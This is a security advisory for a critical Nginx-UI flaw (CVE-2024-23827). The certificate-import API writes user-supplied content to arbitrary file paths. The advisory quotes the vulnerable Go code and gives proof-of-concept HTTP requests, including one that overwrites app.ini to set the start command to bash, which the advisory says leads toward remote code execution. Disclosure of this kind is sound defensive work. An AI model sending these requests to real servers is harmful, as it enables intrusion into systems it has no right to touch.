# Nginx-UI vulnerable to arbitrary file write through the Import Certificate feature

**GHSA**: GHSA-xvq9-4vpv-227m | **CVE**: CVE-2024-23827 | **Severity**: critical (CVSS 9.8)

**CWE**: CWE-22

**Affected Packages**:
- **github.com/0xJacky/Nginx-UI** (go): < 2.0.0-beta.12

## Description

### Summary

The Import Certificate feature allows arbitrary write into the system. The feature does not check if the provided user input is a certification/key and allows to write into arbitrary paths in the system.

https://github.com/0xJacky/nginx-ui/blob/f20d97a9fdc2a83809498b35b6abc0239ec7fdda/api/certificate/certificate.go#L72

```go
func AddCert(c *gin.Context) {
	var json struct {
		Name                  string `json:"name"`
		SSLCertificatePath    string `json:"ssl_certificate_path" binding:"required"`
		SSLCertificateKeyPath string `json:"ssl_certificate_key_path" binding:"required"`
		SSLCertificate        string `json:"ssl_certificate"`
		SSLCertificateKey     string `json:"ssl_certificate_key"`
		ChallengeMethod       string `json:"challenge_method"`
		DnsCredentialID       int    `json:"dns_credential_id"`
	}
	if !api.BindAndValid(c, &json) {
		return
	}
	certModel := &model.Cert{
		Name:                  json.Name,
		SSLCertificatePath:    json.SSLCertificatePath,
		SSLCertificateKeyPath: json.SSLCertificateKeyPath,
		ChallengeMethod:       json.ChallengeMethod,
		DnsCredentialID:       json.DnsCredentialID,
	}

	err := certModel.Insert()

	if err != nil {
		api.ErrHandler(c, err)
		return
	}

	content := &cert.Content{
		SSLCertificatePath:    json.SSLCertificatePath,
		SSLCertificateKeyPath: json.SSLCertificateKeyPath,
		SSLCertificate:        json.SSLCertificate,
		SSLCertificateKey:     json.SSLCertificateKey,
	}

	err = content.WriteFile()

	if err != nil {
		api.ErrHandler(c, err)
		return
	}

	c.JSON(http.StatusOK, Transformer(certModel))
}

```
https://github.com/0xJacky/nginx-ui/blob/f20d97a9fdc2a83809498b35b6abc0239ec7fdda/internal/cert/write_file.go#L15

```go
func (c *Content) WriteFile() (err error) {
	// MkdirAll creates a directory named path, along with any necessary parents,
	// and returns nil, or else returns an error.
	// The permission bits perm (before umask) are used for all directories that MkdirAll creates.
	// If path is already a directory, MkdirAll does nothing and returns nil.

	err = os.MkdirAll(filepath.Dir(c.SSLCertificatePath), 0644)
	if err != nil {
		return
	}

	err = os.MkdirAll(filepath.Dir(c.SSLCertificateKeyPath), 0644)
	if err != nil {
		return
	}

	if c.SSLCertificate != "" {
		err = os.WriteFile(c.SSLCertificatePath, []byte(c.SSLCertificate), 0644)
		if err != nil {
			return
		}
	}

	if c.SSLCertificateKey != "" {
		err = os.WriteFile(c.SSLCertificateKeyPath, []byte(c.SSLCertificateKey), 0644)
		if err != nil {
			return
		}
	}

	return
}
```


### PoC

```
POST /api/cert HTTP/1.1
Host: 127.0.0.1:9000
Content-Length: 144
Accept: application/json, text/plain, */*
Authorization: <JWT>
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Content-Type: application/json
Accept-Encoding: gzip, deflate, br
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8,fr;q=0.7
Connection: close

{"name":"poc","ssl_certificate_path":"/tmp/test","ssl_certificate_key_path":"/tmp/test2","ssl_certificate":"test","ssl_certificate_key":"test2"}
```

```bash
root@aze:~/nginx# ls -la /tmp/test*
-rw-r--r-- 1 root root 4 Jan 24 13:33 /tmp/test
-rw-r--r-- 1 root root 5 Jan 24 13:33 /tmp/test2
```

It's possible to leverage it into an RCE in a senario by overwriting the config file app.ini - But it will require the app.

```bash
root@aze:~/nginx# cat app.ini  | grep "StartCmd"
StartCmd          = login
```
Then we overwrite the `StartCmd` with `bash`

```
POST /api/cert HTTP/1.1
Host: 127.0.0.1:9000
Content-Length: 980
Accept: application/json, text/plain, */*
Authorization: <JWT>
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Content-Type: application/json
Accept-Encoding: gzip, deflate, br
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8,fr;q=0.7
Connection: close

{"name":"poc","ssl_certificate_path":"/root/nginx/app.ini","ssl_certificate_key_path":"/tmp/test2","ssl_certificate":"[server]\r\nHttpHost          = 0.0.0.0\r\nHttpPort          = 9000\r\nRunMode           = debug\r\nJwtSecret         = 504f334b-ac68-4fbc-9160-2ecbf9e5794c\r\nNodeSecret        = 139ab224-9e9e-444f-987e-b3a651175ad5\r\nHTTPChallengePort = 9180\r\nEmail             = props@pros.com\r\nDatabase          = database\r\nStartCmd          = bash\r\nCADir             = dqsdqsd\r\nDemo              = false\r\nPageSize          = 10\r\nGithubProxy       = dqsdqfsdfsdfsdfsd\r\n\r\n[nginx]\r\nAccessLogPath =\r\nErrorLogPath  =\r\nConfigDir     =\r\nPIDPath       =\r\nTestConfigCmd =\r\nReloadCmd     =\r\nRestartCmd    =\r\n\r\n[openai]\r\nBaseUrl = \r\nToken   =\r\nProxy   =\r\nModel   = \r\n\r\n[casdoor]\r\nEndpoint     =\r\nClientId     =\r\nClientSecret =\r\nCertificate  =\r\nOrganization =\r\nApplication  =\r\nRedirectUri  =","ssl_certificate_key":"test2"}
```

```bash
root@aze:~/nginx# cat app.ini  | grep "StartCmd"
StartCmd          = bash
```

For the new config to be applied the app needs to be restarted

![image](https://user-images.githubusercontent.com/26652608/299331664-6415a8c1-6611-4e53-8137-3e574c58da28.png)



### Impact

Arbitrary write/overwrite into the host file system with a risk of remote code execution if the app restarts.
